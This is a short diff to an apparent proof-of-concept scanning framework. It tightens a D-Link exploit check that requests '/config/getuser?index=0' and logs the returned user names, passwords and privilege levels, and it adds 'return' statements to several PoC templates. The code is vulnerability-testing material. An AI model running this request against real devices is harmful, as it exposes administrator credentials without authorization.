@@ -36,6 +36,7 @@ class POC(BasicPoc):
         your poc code here.
         
         """
+        return
 
 
 if __name__ == '__main__':
@@ -67,7 +68,7 @@ class DLinkPoc(BasicPoc):
         poc_url = '/config/getuser?index=0'
         try:
             resp = self.get(target + poc_url)
-            if resp.status_code == 200 and 'name' in resp.text and 'pass' in resp.text:
+            if resp.status_code == 200 and 'name=' in resp.text and 'pass=' in resp.text and 'priv=' in resp.text:
                 logger.success(resp.text)
             elif resp.status_code == 500:
                 logger.error(f'[-] {target} {resp.status_code}')
@@ -104,7 +105,7 @@ class DLinkPoc(AioPoc):
         poc_url = '/config/getuser?index=0'
         try:
             resp = await self.aio_get(target + poc_url)
-            if resp.status_code == 200 and 'name' in resp.text and 'pass' in resp.text:
+            if resp.status_code == 200 and 'name=' in resp.text and 'pass=' in resp.text and 'priv=' in resp.text:
                 logger.success(resp.text)
             elif resp.status_code == 500:
                 logger.error(f'[-] {target} {resp.status_code}')
@@ -143,6 +144,7 @@ class POC(BasicPoc):
         your poc code here.
         
         """
+        return
 
 
 if __name__ == '__main__':
@@ -187,6 +189,7 @@ class POC(BasicPoc):
         """
         
         self.ceyeio.verify(pid, 'dns')
+        return
 
 
 if __name__ == '__main__':
